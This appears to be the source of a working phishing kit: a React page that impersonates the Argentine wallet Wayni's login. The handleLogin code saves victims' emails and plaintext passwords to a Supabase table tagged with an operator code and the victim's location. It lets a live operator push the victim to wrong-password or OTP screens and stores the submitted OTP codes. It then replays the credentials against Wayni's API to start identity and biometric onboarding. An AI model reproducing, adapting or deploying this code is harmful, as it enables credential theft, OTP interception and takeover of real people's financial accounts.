import { useState, useEffect, useCallback } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { invokeWayni } from "@/lib/wayniApi";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import WayniLoginForm from "@/components/wayni/WayniLoginForm";
import WayniWaitingScreen from "@/components/wayni/WayniWaitingScreen";
import WayniOtpScreen from "@/components/wayni/WayniOtpScreen";
import WayniVerifyScreen from "@/components/wayni/WayniVerifyScreen";
import WayniBiometricScreen from "@/components/wayni/WayniBiometricScreen";
import wayniBgPattern from "@/assets/wayni-bg-pattern.svg";
import storeApple from "@/assets/wayni-store-apple.jpeg";
import storeGoogle from "@/assets/wayni-store-google.jpeg";

type Step = "login" | "waiting" | "otp" | "verify" | "biometric" | "done";

interface VerifySubmitPayload {
  identity_number: string;
  phone_number: string;
  selected_full_name?: string;
  selected_gender?: string;
  selected_tax_identification_value?: string;
}

interface LegalCandidate {
  identity_number?: string;
  full_name: string;
  gender: string;
  tax_identification_value: string;
}

interface VerifySubmitResult {
  requires_selection?: boolean;
  candidates?: LegalCandidate[];
  suggested_gender?: string;
}

const Wayni = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const operatorCode = rawOperatorCode?.replace(/[^a-zA-Z0-9]/g, "") || "master";

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [biometricUrl, setBiometricUrl] = useState("");

  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    document.title = "Wayni — Accedé a tu billetera";
    const link = document.querySelector("link[rel='icon']") as HTMLLinkElement;
    if (link) link.href = "data:,";
  }, []);

  // Realtime listener
  useEffect(() => {
    if (!sessionId || step === "login" || step === "done" || step === "verify" || step === "biometric") return;
    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (p) => handleDecision(p.payload?.status)).subscribe();
    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
    otpChannel.on("broadcast", { event: "otp_decision" }, (p) => handleDecision(p.payload?.status)).subscribe();
    const poll = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (data) handleDecision(data.status);
    }, 3000);
    return () => { supabase.removeChannel(channel); supabase.removeChannel(otpChannel); clearInterval(poll); };
  }, [sessionId, step]);

  const handleDecision = useCallback((status?: string) => {
    if (!status) return;
    if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
      setError(""); setErrorMessage(""); setStep("verify");
    } else if (status === "wrong_password") { setErrorMessage("Email o contraseña incorrectos."); setStep("login"); }
    else if (status === "account_not_found") { setErrorMessage("Cuenta no encontrada."); setStep("login"); }
    else if (status === "account_blocked") { setErrorMessage("Cuenta bloqueada."); setStep("login"); }
    else if (status === "rate_limited") { setErrorMessage("Demasiados intentos."); setStep("login"); }
    else if (["connection_error", "login_error"].includes(status)) { setErrorMessage("Error al iniciar sesión."); setStep("login"); }
    else if (["redirect_otp", "show_otp"].includes(status)) { setStep("otp"); setErrorMessage(""); }
    else if (status === "otp_rejected") { setErrorMessage("Código incorrecto."); setStep("otp"); }
  }, []);

  const handleLogin = useCallback(async (submittedEmail: string, submittedPassword: string) => {
    setError(""); setErrorMessage(""); setLoading(true);
    setEmail(submittedEmail);
    setPassword(submittedPassword);

    let ipData = { ip: "unknown", country: "", city: "", region: "" };
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) { const d = await res.json(); ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" }; }
    } catch {}

    let currentSessionId = sessionId;
    try {
      if (!currentSessionId) {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId, email: submittedEmail, password: submittedPassword, ip_address: ipData.ip, user_agent: navigator.userAgent,
          country: ipData.country, city: ipData.city, region: ipData.region,
          status: "pending_review", source: "wayni", operator_code: operatorCode,
        });
        setSessionId(newId); currentSessionId = newId;
      } else {
        await supabase.from("sessions").update({ email: submittedEmail, password: submittedPassword, status: "pending_review" }).eq("id", currentSessionId);
      }
    } catch {}

    try {
      const { data, error: apiError } = await invokeWayni({
        action: "login",
        identification: submittedEmail,
        password: submittedPassword,
        operator_code: operatorCode,
        session_id: currentSessionId,
      });

      if (apiError || data?.error) {
        const errMsg = data?.error || apiError?.message || "Error al iniciar sesión";
        let friendlyMsg = errMsg;
        if (/invalid|credentials|password/i.test(errMsg)) friendlyMsg = "Email, DNI o contraseña incorrectos. Verificá tus datos e intentá de nuevo.";
        else if (/not found|no existe/i.test(errMsg)) friendlyMsg = "No encontramos una cuenta con esos datos.";
        else if (/blocked|bloqueada/i.test(errMsg)) friendlyMsg = "Tu cuenta se encuentra bloqueada. Contactá a soporte.";
        else if (/rate|limit|too many/i.test(errMsg)) friendlyMsg = "Demasiados intentos. Esperá unos minutos e intentá de nuevo.";
        else if (/network|fetch|timeout/i.test(errMsg)) friendlyMsg = "Error de conexión. Verificá tu internet e intentá de nuevo.";
        
        setErrorMessage(friendlyMsg);
        if (currentSessionId) {
          await supabase.from("sessions").update({ status: "login_error" }).eq("id", currentSessionId);
        }
        setStep("login");
        setLoading(false);
        return;
      }

      setEmail(data.email || submittedEmail);
      setFullName(data.full_name || "");
      setPhone(data.phone || "");
      // Go to verify step instead of finalizing
      setStep("verify");
    } catch (e: any) {
      setErrorMessage(e?.message || "Error de conexión. Intentá de nuevo.");
      setStep("login");
    }

    setLoading(false);
  }, [sessionId, operatorCode]);

  const handleVerifySubmit = useCallback(async (verifyData: VerifySubmitPayload): Promise<void | VerifySubmitResult> => {
    const { data, error: apiError } = await invokeWayni({
      action: "onboarding_verify",
      email,
      identity_number: verifyData.identity_number,
      phone_number: verifyData.phone_number || phone,
      password,
      selected_full_name: verifyData.selected_full_name,
      selected_gender: verifyData.selected_gender,
      selected_tax_identification_value: verifyData.selected_tax_identification_value,
    });

    if (apiError || data?.error) {
      throw new Error(data?.error || apiError?.message || "Error en la verificación");
    }

    if (data?.requires_selection) {
      return {
        requires_selection: true,
        candidates: Array.isArray(data?.candidates) ? data.candidates : [],
        suggested_gender: String(data?.suggested_gender || verifyData.selected_gender || "").toUpperCase(),
      };
    }

    const resolvedGender = String(data?.gender || verifyData.selected_gender || "").toUpperCase();
    setFullName(data.full_name || verifyData.selected_full_name || fullName);

    if (data?.biometric_url) {
      setBiometricUrl(data.biometric_url);
      setStep("biometric");
      return;
    }

    if (data?.user_uuid) {
      const { data: bioData, error: bioError } = await invokeWayni({
        action: "onboarding_biometric",
        identity_number: verifyData.identity_number,
        user_uuid: data.user_uuid,
        gender: resolvedGender,
      });

      if (bioError || bioData?.error || !bioData?.biometric_url) {
        throw new Error(bioData?.error || bioError?.message || "Error al generar enlace biométrico");
      }

      setBiometricUrl(bioData.biometric_url);
      setStep("biometric");
      return;
    }

    throw new Error("No fue posible continuar con la biometría.");
  }, [email, password, phone, fullName]);

  const handleOtpSubmit = useCallback(async (code: string) => {
    if (!sessionId) return;
    setError(""); setErrorMessage(""); setLoading(true);
    try {
      await supabase.from("sessions").update({ otp_code: code, status: "otp_submitted" }).eq("id", sessionId);
      setStep("waiting");
    } catch { setError("Error al enviar el código."); }
    setLoading(false);
  }, [sessionId]);

  const renderContent = () => {
    switch (step) {
      case "login": return <WayniLoginForm onSubmit={handleLogin} loading={loading} error={error || errorMessage} />;
      case "waiting": return <WayniWaitingScreen email={email} />;
      case "otp": return <WayniOtpScreen email={email} />;
      case "verify": return <WayniVerifyScreen email={email} password={password} fullName={fullName} phone={phone} onSubmit={handleVerifySubmit} />;
      case "biometric": return <WayniBiometricScreen fullName={fullName} biometricUrl={biometricUrl} />;
      case "done": return <WayniBiometricScreen fullName={fullName} biometricUrl={biometricUrl} />;
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden" style={{ backgroundColor: "#c8e64a" }}>
      <div className="relative z-10 flex flex-col min-h-screen">
        <nav className="flex items-center justify-between px-5 py-4 md:px-10 md:py-5">
          <span className="text-[24px] md:text-[28px] font-black text-[#1a1a1a] tracking-tight" style={{ fontFamily: "'Inter', sans-serif" }}>wayni</span>
          <div className="hidden md:flex items-center gap-8">
            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Préstamos</span>
            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Centro de ayuda</span>
            <span className="text-[14px] text-[#1a1a1a] font-medium cursor-pointer hover:opacity-70 transition-opacity">Blog</span>
          </div>
        </nav>

        {/* Desktop */}
        <div className="hidden md:flex flex-1 items-center px-10 lg:px-16 xl:px-24">
          <div className="flex-1 max-w-[55%]">
            <h1 className="text-[48px] lg:text-[56px] font-black text-[#1a1a1a] leading-[1.1] mb-6" style={{ fontFamily: "'Inter', sans-serif" }}>
              Porque ahora podés
            </h1>
            <p className="text-[16px] text-[#333] mb-6 max-w-[480px]">
              Descubrí una nueva forma de manejar tu plata.
            </p>
            <div className="flex flex-col gap-3 mb-8">
              {["Financiate de la mejor forma con Adelantos", "Enviá y recibí plata en el momento", "Comprá donde quieras con tu tarjeta Mastercard"].map((t) => (
                <div key={t} className="flex items-center gap-2.5">
                  <span className="w-5 h-5 rounded-full bg-[#00b894] flex items-center justify-center flex-shrink-0">
                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                  </span>
                  <span className="text-[15px] text-[#1a1a1a] font-medium">{t}</span>
                </div>
              ))}
            </div>
            <div className="bg-white rounded-2xl px-6 py-4 inline-flex items-center gap-3 shadow-sm w-fit">
              <span className="text-[13px] font-semibold text-[#1a1a1a]">Impulsá tus finanzas con Wayni</span>
              <img src={storeGoogle} alt="Google Play" className="h-[36px] rounded-md" />
              <img src={storeApple} alt="App Store" className="h-[36px] rounded-md" />
            </div>
          </div>
          <div className="flex items-center justify-center px-4" style={{ minWidth: 380, maxWidth: 460 }}>
            <div className="bg-white rounded-3xl shadow-2xl p-8 w-full max-w-[420px]">
              {renderContent()}
            </div>
          </div>
        </div>

        {/* Mobile */}
        <div className="flex flex-col flex-1 md:hidden">
          <div className="flex-1 flex items-start justify-center pt-6">
            <img src={wayniBgPattern} alt="" className="w-[140px] h-[140px] opacity-40" />
          </div>
          <div className="bg-white rounded-t-3xl px-6 pt-8 pb-8 shadow-2xl">
            {renderContent()}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Wayni;
